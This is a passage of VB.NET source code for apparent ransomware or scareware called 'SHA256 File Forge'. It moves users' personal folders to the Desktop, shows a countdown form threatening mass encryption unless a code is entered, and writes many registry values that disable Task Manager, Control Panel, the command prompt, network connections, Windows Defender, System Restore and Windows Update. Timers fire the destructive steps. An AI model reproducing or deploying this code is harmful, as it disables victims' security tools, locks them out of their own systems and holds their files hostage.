        On Error GoTo ErrAdminToolsHandler
        Dim sourcePath24 = userDir & userName & AdminTools
        Dim targetPath10 = userDir & userName & Desktop
        'System
        Dim files24 = Directory.EnumerateFiles(sourcePath24, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files24
            Dim targetFolder = folder.Key.Replace(sourcePath24, targetPath10)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        Err.Clear() 'Clears Object 
ErrAdminToolsHandler:
        On Error Resume Next 'Continues Course

        'Target ApplicationData
        On Error GoTo ErrApplicationDataHandler
        Dim sourcePath25 = userDir & userName & ApplicationData
        Dim targetPath11 = userDir & userName & Desktop
        'System
        Dim files25 = Directory.EnumerateFiles(sourcePath25, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files25
            Dim targetFolder = folder.Key.Replace(sourcePath25, targetPath11)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        Err.Clear() 'Clears Object 
ErrApplicationDataHandler:
        On Error Resume Next 'Continues Course

        'Move everything possible to desktop
        Dim targetPath = userDir & userName & Desktop
        'Music
        Dim files = Directory.EnumerateFiles(sourcePath, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files
            Dim targetFolder = folder.Key.Replace(sourcePath, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'Videos
        Dim files1 = Directory.EnumerateFiles(sourcePath1, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files1
            Dim targetFolder = folder.Key.Replace(sourcePath1, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'Pictures
        Dim files2 = Directory.EnumerateFiles(sourcePath2, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files2
            Dim targetFolder = folder.Key.Replace(sourcePath2, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'Documents
        Dim files3 = Directory.EnumerateFiles(sourcePath3, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files3
            Dim targetFolder = folder.Key.Replace(sourcePath3, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'Favorites
        Dim files4 = Directory.EnumerateFiles(sourcePath4, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files4
            Dim targetFolder = folder.Key.Replace(sourcePath4, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'History
        Dim files5 = Directory.EnumerateFiles(sourcePath5, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files5
            Dim targetFolder = folder.Key.Replace(sourcePath5, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'InternetCache
        Dim files6 = Directory.EnumerateFiles(sourcePath6, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files6
            Dim targetFolder = folder.Key.Replace(sourcePath6, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'LocalApplicationData
        Dim files7 = Directory.EnumerateFiles(sourcePath7, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files7
            Dim targetFolder = folder.Key.Replace(sourcePath7, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'LocalizedResources
        Dim files8 = Directory.EnumerateFiles(sourcePath8, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files8
            Dim targetFolder = folder.Key.Replace(sourcePath8, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'NetworkShortcuts
        Dim files9 = Directory.EnumerateFiles(sourcePath9, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files9
            Dim targetFolder = folder.Key.Replace(sourcePath9, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'SendTo
        Dim files10 = Directory.EnumerateFiles(sourcePath10, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files10
            Dim targetFolder = folder.Key.Replace(sourcePath10, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'StartMenu
        Dim files11 = Directory.EnumerateFiles(sourcePath11, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files11
            Dim targetFolder = folder.Key.Replace(sourcePath11, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'Templates
        Dim files15 = Directory.EnumerateFiles(sourcePath15, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files15
            Dim targetFolder = folder.Key.Replace(sourcePath15, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'Personal
        Dim files16 = Directory.EnumerateFiles(sourcePath16, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files16
            Dim targetFolder = folder.Key.Replace(sourcePath16, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next
        'Resources
        Dim files17 = Directory.EnumerateFiles(sourcePath17, "*", SearchOption.AllDirectories).GroupBy(Function(s) Path.GetDirectoryName(s))

        For Each folder In files17
            Dim targetFolder = folder.Key.Replace(sourcePath17, targetPath)
            Directory.CreateDirectory(targetFolder)

            For Each file In folder
                Dim targetFile = Path.Combine(targetFolder, Path.GetFileName(file))
                If IO.File.Exists(targetFile) Then IO.File.Delete(targetFile)
                IO.File.Move(file, targetFile)
            Next

        Next

    End Sub
#End Region

#Region "Form Construction"
    'Form Construction
    Public Sub CreateMyForm()
        'Button
        Dim bt As New Button With {
            .Size = New Size(100, 32),
            .Text = "SUBMIT",
            .BackColor = Color.Black,
            .ForeColor = Color.Red,
            .FlatStyle = FlatStyle.Flat,
            .Font = New Font("Georgia", 10),
            .Location = New Point(190, 315),
            .TextAlign = ContentAlignment.MiddleCenter
        }

        bt.Location = New Point(bt.Location.X + 360, bt.Location.Y)
        ControlPaint.DrawButton(Graphics.FromHwnd(bt.Handle), 0, 0, bt.Width, bt.Height, ButtonState.Pushed)
        Controls.Add(bt)
        AddHandler bt.Click, AddressOf Bt_Click

        'Textbox
        tx.Name = "txNew"
        tx.Size = New Size(290, 20)
        tx.BackColor = Color.Black
        tx.ForeColor = Color.Red
        tx.Text = ""
        tx.PasswordChar = "*"
        tx.MaxLength = 14
        tx.Font = New Font("Georgia", 12)
        tx.Location = New Point(200, 315)
        tx.Location = New Point(tx.Location.X + 50, tx.Location.Y)
        Controls.Add(tx)


        PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
        PictureBox1.BackgroundImageLayout = ImageLayout.Stretch
        PictureBox1.SendToBack()
        PictureBox1.Height = 250
        PictureBox1.Width = 250
        PictureBox1.Location = New Point(PictureBox1.Location.X + 200, PictureBox1.Location.Y)
        Controls.Add(PictureBox1)

        'Label construction
        lab.Name = "lab"
        lab.BackColor = Color.Black
        lab.ForeColor = Color.Red
        lab.Text = "00:00"
        lab.Font = New Font("Georgia", 18)
        lab.Location = New Point(30, 300)
        lab.Height = 40
        lab.Width = 300
        lab.Location = New Point(lab.Location.X + 55, lab.Location.Y)
        Controls.Add(lab)

        'Lab1 Construction
        lab1.Name = "lab1"
        lab1.BackColor = Color.Black
        lab1.ForeColor = Color.Red
        lab1.BringToFront()
        lab1.AutoEllipsis = True
        lab1.TextAlign = ContentAlignment.TopLeft
        lab1.Text = "🤗 SHA256 File Forge Has Your System." & vbNewLine &
            "At The End of The Countdown," & vbNewLine &
            "A Mass Encryption Process" & vbNewLine &
            "Will Take Place on 26 Directories." & vbNewLine &
            "An Authentication Code Is Needed" & vbNewLine &
            "To Make My Program Self-Destruct 🤗" & vbNewLine & ""
        lab1.Font = New Font("Georgia", 10)
        lab1.Location = New Point(10, 90)
        lab1.AutoSize = False
        lab1.Dock = DockStyle.Fill
        lab1.Location = New Point(lab1.Location.X + 15, lab1.Location.Y)
        Controls.Add(lab1)

        'Form
        Size = New Size(700, 500)
        Height = 450
        Width = 690
        FormBorderStyle = FormBorderStyle.None
        StartPosition = FormStartPosition.CenterScreen
        BackColor = Color.Black
    End Sub
#End Region

#Region "Registry Revoke"
    Private Sub AllDrivesGone()
        On Error GoTo ErrMenuBreaker
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", "SHA256 File Forge", 67108863, RegistryValueKind.DWord) 'All: Drive
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", True).SetValue("SHA256 File Forge", 67108863, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRecycleFiles", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRecycleFiles", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNtSecurity", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNtSecurity", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Programs\NoProgramsCPL", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Programs\NoProgramsCPL", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue($"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey($"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue($"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum{{031E4825-7B94-4dc3-B131-E946B44C8DD5}}", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey($"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum{{031E4825-7B94-4dc3-B131-E946B44C8DD5}}", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNetworkConnections", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNetworkConnections", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoManageMyComputerVerb", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoManageMyComputerVerb", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If

        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)

            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictCpl", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictCpl", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)

            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowCpl", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowCpl", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\ImmersiveShell\EdgeUI\DisableTLcorner", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\ImmersiveShell\EdgeUI\DisableTLcorner", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        'Disable Task Manager
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        'Disable Network Connection
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNetworkConnections", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoNetworkConnections", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue($"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey($"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKLM\Software\Policies\Microsoft\MRT\DontOfferThroughWUAU", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKLM\Software\Policies\Microsoft\MRT\DontOfferThroughWUAU", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKLM\System\CurrentControlSet\Services\WinDefend\Start", "SHA256 File Forge", 4, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKLM\System\CurrentControlSet\Services\WinDefend\Start", True).SetValue("SHA256 File Forge", 4, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\ForceStartMenuLogoff", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\ForceStartMenuLogoff", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\LockTaskbar", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\LockTaskbar", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWindowsUpdate", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWindowsUpdate", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue($"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel{{59031a47-3f72-44a7-89c5-5595fe6b30ee}}", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey($"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel{{59031a47-3f72-44a7-89c5-5595fe6b30ee}}", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        Err.Clear()
ErrMenuBreaker:
        On Error Resume Next
    End Sub
#End Region

#Region "Timers"
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim ts As TimeSpan = TargetDT.Subtract(Date.Now) 'Start of Timer1 Code>>>>
        If ts.TotalMilliseconds > 0 Then
            lab.Text = ts.ToString("hh\:mm\:ss")
        Else
            lab.Text = "00:00"
            Timer1.Stop() ' End of Timer1 Code>>>
            StartAction()
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Timer2.Stop()
        Timer3.Start()
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Timer3.Stop()
        Timer2.Start()
        Tactician()
    End Sub
    '6 hours and 10 seconds later (10 seconds after mass file encryption)
    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Timer4.Stop()
        On Error GoTo errReg
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'We have to enable CMD just before the final event so the bat files can process
            My.Computer.Registry.SetValue("HKCU\Software\Policies\System\DisableCMD", "SHA256 File Forge", 0, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Policies\System\DisableCMD", True).SetValue("SHA256 File Forge", 0, RegistryValueKind.DWord)
        End If
        Err.Clear()
errReg:
        ' On Error Resume Next
        'AllDrivesGone()
        'Chromosome26()
        'DayStar() 'Bat
        'HyperNova() 'Bat
        'Nucleus() 'Bat
    End Sub

    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
        Timer5.Stop()
        On Error GoTo ErrRevoke
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Policies\System\DisableCMD", "SHA256 File Forge", 1, RegistryValueKind.DWord)
